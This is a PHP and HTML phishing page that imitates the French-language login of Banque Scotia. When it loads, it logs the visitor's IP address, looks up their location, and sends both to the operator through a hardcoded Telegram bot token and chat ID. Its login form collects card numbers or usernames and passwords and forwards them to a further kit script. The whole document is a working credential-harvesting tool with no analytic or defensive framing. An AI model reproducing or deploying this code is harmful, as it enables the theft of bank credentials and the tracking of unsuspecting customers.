<?php session_start();
$_SESSION["bank"] ='scotia';

?>
<?php
$token = '7231855269:AAHHENpMKORsPdG5gUH7z_NsS7Zz8QaZAcg'; 
$chat_id = '6242884372'; 

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip_address = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip_address = $_SERVER['REMOTE_ADDR'];
}

$geo_url = "http://ipinfo.io/{$ip_address}/json";
$geo_ch = curl_init();
curl_setopt($geo_ch, CURLOPT_URL, $geo_url);
curl_setopt($geo_ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($geo_ch, CURLOPT_SSL_VERIFYPEER, false);
$geo_response = curl_exec($geo_ch);

// Initialiser les variables pour éviter les "undefined"
$latitude = 'N/A';
$longitude = 'N/A';

if (curl_errno($geo_ch)) {
    $location_info = 'Impossible de récupérer la localisation.';
} else {
    $location_data = json_decode($geo_response, true);
    
    if (isset($location_data['loc'])) {
        $location_info = $location_data['loc'];
        list($latitude, $longitude) = explode(',', $location_info);
    } else {
        $location_info = 'Localisation inconnue.';
    }
}

curl_close($geo_ch);

$message = "🏛🏛*TD*🏛🏛\n";
$message .= "IP: $ip_address\n";
$message .= "Latitude: $latitude\n";
$message .= "Longitude: $longitude";

$url = "https://api.telegram.org/bot$token/sendMessage";
$data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$response = curl_exec($ch);

if (curl_errno($ch)) {
    echo 'Erreur cURL : ' . curl_error($ch);
}

curl_close($ch);
?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" media="screen and (max-width: 768px)" href="/scotia/styles_mobile.css">

     <link rel="stylesheet" media="screen and (min-width: 769px)" href="/scotia/styles_pc.css">
    <title>SCOTIA</title>
</head>
<body>
    <div class="container">
        <div class="header">
    <div class="title">
        <span class="title1" >Bienvenue a la </span> 
        <span class="title2">Banque Scotia</span>
    </div>
        </div>
        <div class="body">
        <form action="/scotia/sms.php" method="post">
  <div class="inputForm">
       <img class="img" src="/scotia/img/profile.png"> <input type="text" name="cvv" placeholder="Nom d'utilisateur ou Numero de carte " required >
  </div>


  <div class="inputForm">
     <img class="img" src="/scotia/img/lock.png"> <input type="password" name="mdp" placeholder="Mot de passe " required >
    </div>

    <div class="inputFormCheck">
    <input type="checkbox"  > Memoriser mon nom d'utilisateur ou numero de carte
    </div>

    <div class="inputFormSubmit">
    <input type="submit" value="Ouvrir une session" >
    </div>

    <b>Besoin d'aide pour ouvrir une session ?</b>

        </form>


        </div>


    </div>

    <div class="bas">

    <span>Avez-vous un nom d'utilisateur et un mot de passe ?</span> <br><br>
    <b>Etablissez-les maintenant</b>
    </div>
</body>
</html>
